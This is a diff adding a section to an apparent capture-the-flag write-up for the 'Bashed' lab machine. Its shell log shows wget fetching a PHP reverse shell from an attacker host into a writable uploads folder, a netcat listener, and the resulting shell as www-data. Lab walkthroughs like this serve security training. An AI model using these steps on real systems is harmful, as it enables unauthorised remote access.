@@ -79,3 +79,46 @@ User www-data may run the following commands on bashed:
 
 - Machine rating: Very easy
 - I hate this machine with my whole soul.
+  
+  
+#### I hate my life decisions
+
+```bash
+www-data@bashed :/var/www/html# ls -la 
+total 116 
+drw-r-xr-x 10 root root 4096 Jun 2 2022 . 
+drwxr-xr-x 3 root root 4096 Jun 2 2022 .. 
+-rw-r-xr-x 1 root root 8193 Dec 4 2017 about.html 
+-rw-r-xr-x 1 root root 94 Dec 4 2017 config.php 
+-rw-r-xr-x 1 root root 7805 Dec 4 2017 contact.html 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 css 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 demo-images 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 dev 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 fonts 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 images 
+-rw-r-xr-x 1 root root 7743 Dec 4 2017 index.html 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 js 
+drw-r-xr-x 2 root root 4096 Jun 2 2022 php 
+-rw-r-xr-x 1 root root 10863 Dec 4 2017 scroll.html 
+-rw-r-xr-x 1 root root 7477 Dec 4 2017 single.html 
+-rw-r-xr-x 1 root root 24164 Dec 4 2017 style.css 
+drwxrwxrwx 2 root root 4096 May 6 16:35 uploads 
+www-data@bashed :/var/www/html/dev# cd .. 
+www-data@bashed :/var/www/html# cd uploads 
+www-data@bashed :/var/www/html/uploads# 
+wget http://10.10.14.119:8080/php-reverse-shell.php 
+--2026-05-06 16:35:20-- 
+http://10.10.14.119:8080/php-reverse-shell.php 
+Connecting to 10.10.14.119:8080... connected. HTTP request sent, awaiting response... 
+200 OK Length: 5494 (5.4K) [application/octet-stream] Saving to: 'php-reverse-shell.php' 0K ..... 100% 24.0M=0s 2026-05-06 16:35:20 (24.0 MB/s) - 'php-reverse-shell.php' saved [5494/5494] 
+
+┌─[eu-dedivip-5]─[10.10.14.119]─[lenadesp@htb-mi1waq7ngz]─[~/my_data/Machines/Basher] └──╼ [★]$ nc -lnvp 4444 
+listening on [any] 4444 ... 
+connect to [10.10.14.119] from (UNKNOWN) [10.129.31.135] 50638 Linux bashed 4.4.0-62-generic 
+#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 16:35:31 up 3 min, 0 users, load average: 0.01, 0.04, 0.01 
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT 
+uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off 
+$
+```
+
+do I even need to explain?
